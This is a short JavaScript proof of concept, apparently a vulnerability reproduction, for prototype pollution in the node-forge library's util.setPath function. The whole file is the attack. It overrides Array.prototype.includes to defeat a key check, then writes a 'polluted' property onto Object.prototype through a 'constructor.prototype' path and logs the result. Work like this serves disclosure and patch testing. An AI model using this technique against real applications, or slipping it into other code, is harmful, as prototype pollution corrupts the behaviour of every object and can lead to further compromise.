Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const nodeforge = require('node-forge');
const obj = {};
nodeforge.util.setPath(obj, [
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);